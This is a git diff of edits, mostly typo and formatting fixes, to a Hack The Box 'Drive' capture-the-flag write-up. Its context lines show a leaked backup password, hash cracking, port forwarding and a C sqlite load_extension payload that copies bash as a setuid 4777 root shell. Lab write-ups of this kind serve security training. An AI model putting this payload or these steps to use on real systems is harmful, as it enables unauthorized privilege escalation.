@@ -1,7 +1,7 @@
 # HTB - Drive
 
 ### TL;DR
-This is an Ubuntu 20.04 host running a custom web app called doodleGrive which is used to share and edit files. A clear text password is uploaded into the tool which can be used to get an initial foothold. An internal gitea server, used to for changes control, also contains clear text password which allows accessing database backups. For privilege escalation, reversing in a local binary and sqlite insjection are needed. To get code execution, the sqlite `load_extensions()` function is used.
+This is an Ubuntu 20.04 host running a custom web app called doodleGrive which is used to share and edit files. A clear text password is uploaded into the tool which can be used to get an initial foothold. An internal gitea server, used for config control, also contains clear text password which allows accessing database backups. For privilege escalation, reversing in a local binary and sqlite insjection are needed. To get code execution, the sqlite `load_extensions()` function is used.
 
 __Keywords:__<br>
 gitea, port forwarding, reversing, ghidra, c, sqlite injection, load_extensions()<br>
@@ -70,7 +70,7 @@ In bash, edit the `request.txt` file to prepare it for `ffuf`. Edit with `vim` t
 
 Prepare a wordlist with 200 items and launch `ffuf` using the `request.txt` file. Several documents are found.
 ```markdown
-> seq 1 100 > fuzz
+> seq 1 200 > fuzz
 
 > ffuf -c -request request.txt -request-proto http -t 100 -w ./fuzz
 101                     [Status: 200, Size: 1927, Words: 3, Lines: 4]
@@ -98,6 +98,7 @@ martinCruz
 tomHands
 crisDisel
 ```
+We will use this user list later.
 <br>
 <br>
 ### PHASE 2. User
@@ -105,7 +106,7 @@ Just use martin's credentials to ssh in. First task is to enumerate system users
 
 ![drive6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b85d4b33-654f-431d-8e78-72c23008f533)
 
-Scanning processes with pspy64, we find a gitea web server running under the context of user git `uid=115`. This service was not discovered with nmap, so maybe it is an internal service.
+Scanning processes with `pspy64`, we find a gitea web server running under the context of user git `uid=115`. This service was not discovered with nmap, so maybe it is an internal service.
 
 ![drive7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/0d4557e7-ab9e-4917-b32a-2009282a6a4f)
 
@@ -117,12 +118,12 @@ Let's forward port 3000 to our machine.
 ```markdown
 > ssh -f -N -L 3000:127.0.0.1:3000 martin@drive.htb
 ```
-Now we can browse the gitea server on http://localhost:3000, where martin's credentials are accepted. For this, we find tool martin username is `martinCruz`, as we found in the previous step.
+Now we can browse the gitea server on http://localhost:3000, where martin's credentials are accepted. For this tool martin's username is `martinCruz`, as we found in the previous step.
 
 ![drive9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/55675377-7b34-4cbe-8dab-ecec3fdf6245)
 
 In the DoodleGrive repository there is the database encryption script `db_backup.sh`, and the key they used to compress the 7z files. The password is `H@ckThisP@ssW0rDIfY0uC@n:)`
-Using this, we unzip the database backups. First, copy the files to kali using `scp`, then unzip using the password.
+To unzio the files, first copy the files to kali using `scp`, then unzip using the password.
 ```markdown
 > scp martin@drive.htb:/var/www/backups/1_Sep_db_backup.sqlite3.7z ~/htb/drive
 martin@drive.htb's password: 
@@ -139,7 +140,7 @@ select * from accounts_customuser;
 
 ![drive10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f9ffde93-4a2c-42b3-903d-bbd556d085e5)
 
-To crack these hashes, refer to hashcat documentation (https://hashcat.net/wiki/doku.php?id=example_hashes). Searching in the documentation for the hashes beginning with "sha1$", we find out that its correspondent hashcat module is 124.
+To crack these hashes, refer to hashcat documentation (https://hashcat.net/wiki/doku.php?id=example_hashes). Searching in the documentation for the hashes beginning with `sha1$`, we find out that its correspondent hashcat module is 124.
  
 ![drive11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f59935c2-19db-42e0-8c19-7486b1161026)
 
@@ -191,7 +192,7 @@ We see the function removes several characters and replaces them with a null cha
 
 The next goal is to investigate how to gain command execution using sqlite statements. This can be done using `load_extensions()` functions. Basically, this feature allows to load c code compiled as a `.so` shared library. In the link https://www.sqlite.org/loadext.html you can find instructions to compile the source code.
 First step is to generate a c payload load extension called `le.c`
-```
+```c
 # include <stdio.h>
 # include <stdlib.h>
 
@@ -200,7 +201,7 @@ static void inject() __attribute__((constructor));
 void inject() {
      system("/usr/bin/cp /bin/bash /var/tmp/bs && /usr/bin/chmod 4777 /var/tmp/bs");
 }
-```c
+```
 Next, compile following sqlite documentation.
 ```markdown
 gcc -g -shared -fPIC ./le.c -o ./le.so
@@ -220,7 +221,7 @@ Final steps are injecting the payload in the tool.
 
 ![drive18](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/5c288903-b57a-4798-91cd-5c48cfee8c22)
 
-And checking that everything went.
+And checking that everything went well.
 
 ![drive19](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d4758acc-80ec-455f-b55c-289120834168)
 
